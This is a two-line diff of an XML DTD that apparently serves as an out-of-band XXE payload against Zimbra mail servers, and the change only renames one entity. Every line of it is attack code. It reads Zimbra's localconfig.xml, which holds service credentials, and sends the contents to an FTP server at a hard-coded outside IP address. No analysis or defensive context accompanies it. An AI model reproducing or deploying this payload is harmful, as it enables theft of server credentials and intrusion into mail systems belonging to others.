@@ -1,2 +1,2 @@
 <!ENTITY % d SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://91.235.116.123:2121/%d;'>">
+<!ENTITY % start "<!ENTITY rrr SYSTEM 'ftp://91.235.116.123:2121/%d;'>">
